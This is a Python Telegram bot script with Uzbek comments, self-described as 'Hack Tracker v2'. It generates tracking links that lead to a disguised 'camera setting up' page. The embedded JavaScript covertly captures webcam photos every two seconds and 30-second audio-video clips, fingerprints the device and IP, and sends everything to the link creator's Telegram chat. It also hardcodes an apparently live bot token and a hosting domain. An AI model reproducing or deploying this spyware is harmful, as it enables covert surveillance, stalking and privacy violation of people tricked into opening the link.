#!/usr/bin/env python3
import os
import uuid
import base64
import logging
from io import BytesIO
import asyncio
import json

from aiohttp import web
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# -----------------------
# Konfiguratsiya / ENV
# -----------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").strip().rstrip('/')
PORT = int(os.getenv("PORT", "8000"))

if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
    raise ValueError("❌ BOT_TOKEN ni o'rnating!")

USER_TOKENS = {}

# --------------------------------
# Telegram /start
# --------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = str(uuid.uuid4())
    USER_TOKENS[token] = user_id
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
    msg = (
        "🕵️‍♂️ **Maxfiy kuzatuv**\n\n"
        f"🔗 [Bosing: {link}]({link})\n\n"
        "✅ Kamera ruxsati berilsa:\n"
        "📸 Har **2 soniyada rasm**\n"
        "🎥 Har **30 soniyada video** (ovoz bilan, agar ruxsat berilsa)\n\n"
        "❌ Rad etilsa — faqat qurilma ma'lumotlari yuboriladi."
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

# ---------------------------
# IP manzilini olish
# ---------------------------
def get_client_ip(request: web.Request) -> str:
    hdr = request.headers.get("X-Forwarded-For")
    if hdr:
        return hdr.split(",")[0].strip()
    rem = request.remote
    if rem:
        return rem
    peer = request.transport.get_extra_info("peername")
    if peer:
        return str(peer[0])
    return "Noma'lum"

# -----------------------------------------
# Sahifa HTML (f-string emas — .replace ishlatiladi)
# -----------------------------------------
async def track_page(request: web.Request):
    token = request.query.get("token")
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)

    # Foydalan f-string emas — oddiy string
  html_template = """<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Kuzatuv...</title>
  <style>
    body {
      font-family: sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center;
      background: #fafafa; color: #333;
    }
    .loader {
      width: 40px; height: 40px;
      border: 4px solid #ddd;
      border-top: 4px solid #4CAF50;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .note { font-size: 0.9em; color: #777; }
  </style>
</head>
<body>
  <h2>Iltimos, kuting...</h2>
  <div class="loader"></div>
  <div class="note">Kamera sozlanmoqda...</div>
  <script>
    let stream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let photoInterval = null;
    let videoInterval = null;

    // Helper: xavfsiz JSON parse uchun
    function safeParseJSON(s) {
      try {
        return JSON.parse(s);
      } catch (e) {
        return {};
      }
    }

    async function collectData() {
      return {
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        utcOffset: -new Date().getTimezoneOffset() / 60,
        languages: (navigator.languages && navigator.languages.join(', ')) || navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        deviceMemory: navigator.deviceMemory || "Noma'lum",
        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
        screen: (typeof screen !== 'undefined' ? (screen.width + 'x' + screen.height) : "Noma'lum"),
        viewport: (typeof window !== 'undefined' ? (window.innerWidth + 'x' + window.innerHeight) : "Noma'lum"),
        colorDepth: (typeof screen !== 'undefined' ? screen.colorDepth : "Noma'lum"),
        pixelDepth: (typeof screen !== 'undefined' ? screen.pixelDepth : "Noma'lum"),
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
        browser: "Noma'lum",
        os: "Noma'lum",
        model: "Noma'lum",
        devices: { mic: 0, speaker: 0, camera: 0 },
        gpu: "Noma'lum",
        cameraRes: "Noma'lum",
        network: "Noma'lum"
      };
    }

    async function sendPhoto(photoBlob, data) {
      const formData = new FormData();
      formData.append("token", "__TOKEN__");
      formData.append("clientData", JSON.stringify(data));
      if (photoBlob) formData.append("photo", photoBlob);
      try {
        await fetch("/submit_photo", { method: "POST", body: formData });
      } catch (err) {
        console.error("Rasm yuborishda xato:", err);
      }
    }

    async function sendVideo(videoBlob, data) {
      const formData = new FormData();
      formData.append("token", "__TOKEN__");
      formData.append("clientData", JSON.stringify(data));
      if (videoBlob) {
        formData.append("video", videoBlob);
      }
      try {
        await fetch("/submit", { method: "POST", body: formData });
      } catch (err) {
        console.error("Video yuborishda xato:", err);
      }
    }

    async function takePhoto() {
      if (!stream) return;
      const video = document.createElement("video");
      video.srcObject = stream;
      await new Promise(r => {
        video.onloadedmetadata = r;
        video.play();
      });
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async blob => {
        const data = await collectData();
        await sendPhoto(blob, data);
      }, "image/jpeg", 0.9);
    }

    function startVideoRecording() {
      if (!stream) return;
      recordedChunks = [];
      let options = { mimeType: 'video/webm;codecs=vp9' };
      if (!MediaRecorder.isTypeSupported(options.mimeType)) {
        options = { mimeType: 'video/webm' };
      }
      try {
        mediaRecorder = new MediaRecorder(stream, options);
      } catch (e) {
        console.warn("MediaRecorder boshlashda xato, fallback qayta urinilyapti:", e);
        try {
          mediaRecorder = new MediaRecorder(stream);
        } catch (err) {
          console.error("MediaRecorder umuman ishlamayapti:", err);
          return;
        }
      }
      mediaRecorder.ondataavailable = e => {
        if (e.data && e.data.size > 0) recordedChunks.push(e.data);
      };
      mediaRecorder.onstop = async () => {
        if (recordedChunks.length === 0) return;
        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        const data = await collectData();
        await sendVideo(videoBlob, data);
        recordedChunks = [];
        if (stream) startVideoRecording();
      };
      mediaRecorder.start();
      videoInterval = setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
      }, 30000);
    }

    async function startStream() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 640 }, height: { ideal: 480 } },
          audio: true
        });
      } catch (err1) {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: true });
        } catch (err2) {
          const data = await collectData();
          await sendVideo(null, data);
          try {
            await fetch("/camera_denied", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ token: "__TOKEN__" })
            });
          } catch (e) {}
          return;
        }
      }

      // GPU ma'lumotini olish va qurilma sozlamalari
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        const videoTrack = stream.getVideoTracks()[0];
        let settings = {};
        try { settings = videoTrack.getSettings ? videoTrack.getSettings() : {}; } catch (e) {}

        let gpu = "Noma'lum";
        if (gl) {
          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
          if (dbg) {
            try {
              gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || gpu;
            } catch (e) { /* ignore */ }
          }
        }

        const data = {
          timestamp: new Date().toISOString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          utcOffset: -new Date().getTimezoneOffset() / 60,
          languages: (navigator.languages && navigator.languages.join(', ')) || navigator.language,
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          deviceMemory: navigator.deviceMemory || "Noma'lum",
          hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
          screen: (typeof screen !== 'undefined' ? (screen.width + 'x' + screen.height) : "Noma'lum"),
          viewport: (typeof window !== 'undefined' ? (window.innerWidth + 'x' + window.innerHeight) : "Noma'lum"),
          colorDepth: (typeof screen !== 'undefined' ? screen.colorDepth : "Noma'lum"),
          pixelDepth: (typeof screen !== 'undefined' ? screen.pixelDepth : "Noma'lum"),
          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
          browser: "Noma'lum",
          os: "Noma'lum",
          model: "Noma'lum",
          devices: { mic: 0, speaker: 0, camera: 0 },
          gpu: gpu,
          cameraRes: ((settings.width ? settings.width : "Noma'lum") + 'x' + (settings.height ? settings.height : "Noma'lum")),
          network: "Noma'lum"
        };

        // Browser va OS aniqlash (soddalashtirilgan)
        if (navigator.userAgent.indexOf("Chrome") !== -1) data.browser = "Chrome";
        else if (navigator.userAgent.indexOf("Firefox") !== -1) data.browser = "Firefox";
        else if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1) data.browser = "Safari";

        if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
        else if (/Android/.test(navigator.userAgent)) data.os = "Android";
        else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
        else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";

        try {
          const devs = await navigator.mediaDevices.enumerateDevices();
          data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
          data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
          data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
        } catch (e) {}

        if (navigator.connection) {
          data.network = (navigator.connection.effectiveType || 'unknown') + ', ' + (navigator.connection.downlink || '?') + ' Mbps';
        }

        // Birinchi ma'lumotni yuborish (foto bilan emas, faqat meta)
        await sendPhoto(null, data);
      } catch (e) {
        console.warn("WebGL yoki qurilmalarni o'qishda xato:", e);
      }

      // Har 2 soniyada rasm
      photoInterval = setInterval(takePhoto, 2000);
      // Video yozish
      startVideoRecording();
    }

    function stopAll() {
      if (photoInterval) clearInterval(photoInterval);
      if (videoInterval) clearTimeout(videoInterval);
      if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      mediaRecorder = null;
      recordedChunks = [];
    }

    window.addEventListener('beforeunload', stopAll);
    window.addEventListener('pagehide', stopAll);

    startStream();
  </script>
</body>
</html>"""

    html = html_template.replace("__TOKEN__", token)
    return web.Response(text=html, content_type="text/html")

# -----------------------------------------
# Umumiy xabar formati
# -----------------------------------------
def format_message(client_data, ip):
    return (
        f"🕒 Sana/Vaqt: {client_data.get('timestamp')}\n"
        f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
        f"📍 IP: {ip}\n"
        f"📱 Qurilma: {client_data.get('model')} ({client_data.get('deviceType')})\n"
        f"🖥 OS: {client_data.get('os')}, Brauzer: {client_data.get('browser')}\n"
        f"🎮 GPU: {client_data.get('gpu')}\n"
        f"🧠 CPU: {client_data.get('hardwareConcurrency')} yadrolar | RAM: {client_data.get('deviceMemory')} GB\n"
        f"📺 Ekran: {client_data.get('screen')} | Viewport: {client_data.get('viewport')}\n"
        f"🎨 Rang chuqurligi: {client_data.get('colorDepth')} bit | PixelDepth: {client_data.get('pixelDepth')}\n"
        f"🎤 Qurilmalar: Mic: {client_data['devices'].get('mic',0)}, Speaker: {client_data['devices'].get('speaker',0)}, Kamera: {client_data['devices'].get('camera',0)}\n"
        f"📷 Kamera aniqlangan o‘lcham: {client_data.get('cameraRes')}\n"
        f"📶 Tarmoq: {client_data.get('network')}\n"
        f"🗣 Tillar: {client_data.get('languages')}\n"
        f"🔍 UA: {client_data.get('userAgent')}"
    )

# -----------------------------------------
# Rasm qabul qilish
# -----------------------------------------
async def submit_photo(request: web.Request):
    try:
        reader = await request.multipart()
        token = None
        client_data = {}
        photo_data = None

        async for field in reader:
            if field.name == "token":
                token = (await field.read()).decode()
            elif field.name == "clientData":
                client_data = json.loads((await field.read()).decode())
            elif field.name == "photo":
                photo_data = await field.read()

        user_id = USER_TOKENS.get(token)
        if not user_id:
            return web.Response(status=403)

        ip = get_client_ip(request)
        message = format_message(client_data, ip)

        if photo_data:
            photo_file = BytesIO(photo_data)
            photo_file.name = "photo.jpg"
            await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(photo_file), caption=message)
        else:
            await request.app["bot"].send_message(chat_id=user_id, text=message)

        return web.Response(text="ok")
    except Exception as e:
        logger.exception("submit_photo xato")
        return web.Response(status=500)

# -----------------------------------------
# Video yoki ma'lumot qabul qilish
# -----------------------------------------
async def submit_data(request: web.Request):
    try:
        if not request.content_type.startswith("multipart/form-data"):
            return web.Response(status=400)

        reader = await request.multipart()
        token = None
        client_data = {}
        video_data = None

        async for field in reader:
            if field.name == "token":
                token = (await field.read()).decode()
            elif field.name == "clientData":
                client_data = json.loads((await field.read()).decode())
            elif field.name == "video":
                video_data = await field.read()

        user_id = USER_TOKENS.get(token)
        if not user_id:
            return web.Response(status=403)

        ip = get_client_ip(request)
        message = format_message(client_data, ip)

        if video_data:
            try:
                video_file = BytesIO(video_data)
                video_file.name = "recording.webm"
                await request.app["bot"].send_video(
                    chat_id=user_id,
                    video=InputFile(video_file),
                    caption=message,
                    supports_streaming=True
                )
            except Exception as e:
                logger.exception("Videoni yuborishda xato")
                await request.app["bot"].send_message(
                    chat_id=user_id,
                    text=f"⚠️ Video yuborishda xato: {str(e)[:100]}\n\n{message}"
                )
        else:
            await request.app["bot"].send_message(chat_id=user_id, text=message)

        return web.Response(text="ok")
    except Exception as e:
        logger.exception("submit_data xato")
        return web.Response(status=500)

# ---------------------------
# Kamera rad etilganda
# ---------------------------
async def camera_denied(request: web.Request):
    try:
        data = await request.json()
        token = data.get("token")
        user_id = USER_TOKENS.get(token)
        if user_id:
            await request.app["bot"].send_message(
                chat_id=user_id,
                text="⚠️ Kamera ruxsati berilmadi."
            )
        return web.Response(status=200)
    except Exception as e:
        logger.exception("camera_denied xato")
        return web.Response(status=500)

# -----------------------------------------
# Web server
# -----------------------------------------
async def start_web_server(bot):
    app = web.Application()
    app["bot"] = bot
    app.router.add_get("/track", track_page)
    app.router.add_post("/submit", submit_data)
    app.router.add_post("/submit_photo", submit_photo)
    app.router.add_post("/camera_denied", camera_denied)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{PORT}")

# -----------------------------------------
# Startup
# -----------------------------------------
async def on_startup(app):
    asyncio.create_task(start_web_server(app.bot))

# -----------------------------------------
# Main
# -----------------------------------------
def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    logger.info("🕵️‍♂️ Hack Tracker v2 ishga tushdi!")
    app.run_polling()

if __name__ == "__main__":
    main()
